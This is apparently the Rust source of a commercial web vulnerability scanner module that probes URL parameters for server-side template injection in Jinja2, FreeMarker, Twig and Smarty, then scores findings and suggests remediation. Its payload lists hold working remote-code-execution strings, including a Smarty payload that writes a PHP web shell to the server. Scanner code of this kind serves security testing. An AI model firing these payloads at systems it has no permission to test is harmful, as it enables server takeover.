// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Template Injection Scanner (SSTI)
 * Tests for Server-Side Template Injection vulnerabilities
 *
 * Detects:
 * - Jinja2 template injection (Python/Flask)
 * - FreeMarker template injection (Java)
 * - Twig template injection (PHP/Symfony)
 * - Smarty template injection (PHP)
 * - Mathematical expression evaluation
 * - Template engine fingerprinting
 * - RCE via template injection
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct TemplateInjectionScanner {
    http_client: Arc<HttpClient>,
}

impl TemplateInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for template injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // PREMIUM FEATURE: Template Injection requires Professional license
        if !crate::license::is_feature_available("template_injection") {
            debug!("[SSTI] Feature requires Professional license or higher");
            return Ok((vulnerabilities, tests_run));
        }

        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
            debug!("[SSTI] Skipping framework/internal parameter: {}", param_name);
            return Ok((vulnerabilities, tests_run));
        }

        info!("[SSTI] Testing parameter: {} (priority: {})",
              param_name,
              ParameterFilter::get_parameter_priority(param_name));

        info!("Testing SSTI on parameter: {}", param_name);

        // Template engines to test
        let engines = vec!["jinja2".to_string(), "freemarker".to_string(), "twig".to_string(), "smarty".to_string()];

        for engine in engines {
            let payloads = self.get_engine_payloads(&engine);

            for (payload, description) in payloads {
                tests_run += 1;

                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param_name, urlencoding::encode(&payload))
                } else {
                    format!("{}?{}={}", url, param_name, urlencoding::encode(&payload))
                };

                match self.http_client.get(&test_url).await {
                    Ok(response) => {
                        if let Some(vuln) = self.analyze_response(
                            &response.body,
                            &payload,
                            &engine,
                            &description,
                            &test_url,
                            param_name,
                        ) {
                            info!("SSTI vulnerability detected: {} - {}", engine, &description);
                            vulnerabilities.push(vuln);
                            return Ok((vulnerabilities, tests_run)); // Stop testing this parameter
                        }
                    }
                    Err(e) => {
                        debug!("Request failed: {}", e);
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan endpoint for template injection (general scan)
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Common parameters vulnerable to SSTI
        let common_params = vec![
            "template".to_string(), "view".to_string(), "page".to_string(), "name".to_string(), "user".to_string(), "message".to_string(),
            "comment".to_string(), "content".to_string(), "text".to_string(), "data".to_string(), "input".to_string(), "email".to_string(),
        ];

        for param in common_params {
            let (vulns, tests) = self.scan_parameter(url, &param, config).await?;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // If we found a vulnerability, stop testing
            if !all_vulnerabilities.is_empty() {
                break;
            }
        }

        Ok((all_vulnerabilities, total_tests))
    }

    /// Get payloads for specific template engine
    fn get_engine_payloads(&self, engine: &str) -> Vec<(String, String)> {
        match engine {
            "jinja2" => vec![
                // Mathematical evaluation
                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
                ("{{7*'7'}}".to_string(), "String multiplication".to_string()),
                ("{{config}}".to_string(), "Config object access".to_string()),
                ("{{request}}".to_string(), "Request object access".to_string()),

                // RCE attempts
                ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(), "RCE via config".to_string()),
                ("{{''.__class__.__mro__[1].__subclasses__()}}".to_string(), "Class traversal".to_string()),
                ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(), "Import os".to_string()),

                // Detection payloads
                ("{{''.join(['a','b','c'])}}".to_string(), "String join".to_string()),
                ("{{7*7}}{{config.items()}}".to_string(), "Combined evaluation".to_string()),
            ],

            "freemarker" => vec![
                // Mathematical evaluation
                ("${7*7}".to_string(), "Math evaluation 7*7".to_string()),
                ("#{7*7}".to_string(), "Alternate syntax".to_string()),

                // Object access
                ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}".to_string(), "RCE via Execute".to_string()),
                ("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}".to_string(), "ProcessBuilder RCE".to_string()),

                // Detection
                ("${'test'.substring(0,1)}".to_string(), "String method".to_string()),
                ("${7*7}${7+7}".to_string(), "Multiple expressions".to_string()),
            ],

            "twig" => vec![
                // Mathematical evaluation
                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
                ("{{7*'7'}}".to_string(), "String multiplication".to_string()),

                // Object access
                ("{{_self}}".to_string(), "Self object".to_string()),
                ("{{_self.env}}".to_string(), "Environment object".to_string()),
                ("{{_self.env.getFilter}}".to_string(), "Filter access".to_string()),
                ("{{dump(app)}}".to_string(), "App dump".to_string()),

                // RCE attempts
                ("{{['id']|map('system')|join}}".to_string(), "System via map filter".to_string()),
                ("{{['id','id']|filter('system')}}".to_string(), "System via filter".to_string()),

                // Detection
                ("{{\"test\"|upper}}".to_string(), "String filter".to_string()),
            ],

            "smarty" => vec![
                // Mathematical evaluation
                ("{7*7}".to_string(), "Math evaluation 7*7".to_string()),
                ("{$smarty.version}".to_string(), "Smarty version".to_string()),

                // RCE attempts
                ("{php}echo `id`;{/php}".to_string(), "PHP tag execution".to_string()),
                ("{literal}{php}system('id');{/php}{/literal}".to_string(), "PHP in literal".to_string()),
                ("{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}".to_string(), "File write".to_string()),

                // Detection
                ("{$smarty.get.test}".to_string(), "GET variable".to_string()),
                ("{if 7*7==49}vulnerable{/if}".to_string(), "Conditional".to_string()),
            ],

            _ => vec![],
        }
    }

    /// Analyze response for template injection indicators
    fn analyze_response(
        &self,
        body: &str,
        payload: &str,
        engine: &str,
        description: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        // Check for mathematical evaluation (7*7 = 49)
        if payload.contains("7*7") {
            if body.contains("49") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    "Template expression evaluated: 7*7 = 49",
                    Confidence::High,
                    Severity::Critical,
                ));
            }

            // Check for "fortynine" or similar
            if body.to_lowercase().contains("fortynine") || body.to_lowercase().contains("forty-nine") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    "Mathematical expression evaluated in template (textual)",
                    Confidence::High,
                    Severity::Critical,
                ));
            }
        }

        // Check for string multiplication (7*'7' = 7777777)
        if payload.contains("7*'7'") && body.contains("7777777") {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                engine,
                description,
                "String multiplication in template: 7*'7' = 7777777",
                Confidence::High,
                Severity::Critical,
            ));
        }

        // Engine-specific detection
        let detected = match engine {
            "jinja2" => {
                body.contains("jinja") ||
                body.contains("<class") ||
                body.contains("__mro__") ||
                body.contains("__subclasses__") ||
                body.contains("__builtins__") ||
                (payload.contains("config") && body.contains("Config"))
            },

            "freemarker" => {
                body.contains("freemarker") ||
                body.contains("FreeMarker") ||
                body.contains("TemplateException") ||
                (payload.contains("Execute") && body.contains("uid="))
            },

            "twig" => {
                body.contains("_self") ||
                body.contains("Twig") ||
                body.contains("TwigEnvironment") ||
                (payload.contains("dump(app)") && body.contains("app"))
            },

            "smarty" => {
                body.contains("Smarty") ||
                body.contains("{php}") ||
                body.contains("{/php}") ||
                body.contains("Smarty_Internal")
            },

            _ => false,
        };

        if detected {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                engine,
                description,
                &format!("{} template engine detected in response", engine),
                Confidence::Medium,
                Severity::High,
            ));
        }

        // Check for command execution output
        let cmd_indicators = vec![
            "uid=", "gid=",  // Unix id command
            "root:", "user:",  // User info
            "/bin/", "/usr/",  // Paths
            "Administrator", "SYSTEM",  // Windows
        ];

        for indicator in cmd_indicators {
            if body.contains(indicator) {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    &format!("Command execution detected: {}", indicator),
                    Confidence::High,
                    Severity::Critical,
                ));
            }
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        engine: &str,
        description: &str,
        evidence: &str,
        confidence: Confidence,
        severity: Severity,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.5,
            Severity::Medium => 6.5,
            _ => 4.0,
        };

        let verified = matches!(confidence, Confidence::High);

        Vulnerability {
            id: format!("ssti_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("Server-Side Template Injection ({})", engine.to_uppercase()),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Server-Side Template Injection ({}) in parameter '{}': {}",
                engine, param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-94".to_string(),
            cvss: cvss as f32,
            verified,
            false_positive: false,
            remediation: format!(
                "1. Never use user input in template expressions\n\
                 2. Use sandboxed template environments (SandboxedEnvironment for Jinja2)\n\
                 3. Avoid server-side template rendering with user input\n\
                 4. Implement input validation and sanitization\n\
                 5. Use logic-less template engines (Mustache, Handlebars)\n\
                 6. Disable dangerous template functions ({} specific)\n\
                 7. Apply principle of least privilege to template context",
                engine
            ),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> TemplateInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        TemplateInjectionScanner::new(http_client)
    }

    #[test]
    fn test_analyze_jinja2_math_evaluation() {
        let scanner = create_test_scanner();

        let body = "Result: 49";
        let result = scanner.analyze_response(
            body,
            "{{7*7}}",
            "jinja2",
            "Math evaluation",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.cwe, "CWE-94");
        assert_eq!(vuln.severity, Severity::Critical);
    }

    #[test]
    fn test_analyze_string_multiplication() {
        let scanner = create_test_scanner();

        let body = "Output: 7777777";
        let result = scanner.analyze_response(
            body,
            "{{7*'7'}}",
            "jinja2",
            "String multiplication",
            "http://example.com",
            "name",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("jinja2"));
    }

    #[test]
    fn test_analyze_jinja2_class_detection() {
        let scanner = create_test_scanner();

        let body = "<class 'flask.config.Config'>";
        let result = scanner.analyze_response(
            body,
            "{{config}}",
            "jinja2",
            "Config access",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::High);
    }

    #[test]
    fn test_analyze_command_execution() {
        let scanner = create_test_scanner();

        let body = "uid=1000(user) gid=1000(user)";
        let result = scanner.analyze_response(
            body,
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "jinja2",
            "RCE attempt",
            "http://example.com",
            "data",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
        assert!(vuln.evidence.unwrap().contains("uid="));
    }

    #[test]
    fn test_analyze_freemarker_detection() {
        let scanner = create_test_scanner();

        let body = "FreeMarker Template Error";
        let result = scanner.analyze_response(
            body,
            "${7*7}",
            "freemarker",
            "Math evaluation",
            "http://example.com",
            "view",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.vuln_type.contains("FREEMARKER"));
    }

    #[test]
    fn test_analyze_twig_detection() {
        let scanner = create_test_scanner();

        let body = "Twig_Environment object";
        let result = scanner.analyze_response(
            body,
            "{{_self.env}}",
            "twig",
            "Environment access",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
    }

    #[test]
    fn test_analyze_smarty_detection() {
        let scanner = create_test_scanner();

        let body = "Smarty version 3.1.39";
        let result = scanner.analyze_response(
            body,
            "{$smarty.version}",
            "smarty",
            "Version detection",
            "http://example.com",
            "page",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.vuln_type.contains("SMARTY"));
    }

    #[test]
    fn test_analyze_safe_response() {
        let scanner = create_test_scanner();

        let body = "Normal page content without template injection";
        let result = scanner.analyze_response(
            body,
            "{{7*7}}",
            "jinja2",
            "Test",
            "http://example.com",
            "q",
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_get_jinja2_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_engine_payloads("jinja2");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("7*7")));
        assert!(payloads.iter().any(|(p, _)| p.contains("config")));
    }

    #[test]
    fn test_get_freemarker_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_engine_payloads("freemarker");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("${")));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/search",
            "q",
            "{{7*7}}",
            "jinja2",
            "Math evaluation",
            "Expression evaluated: 49",
            Confidence::High,
            Severity::Critical,
        );

        assert_eq!(vuln.vuln_type, "Server-Side Template Injection (JINJA2)");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-94");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }
}
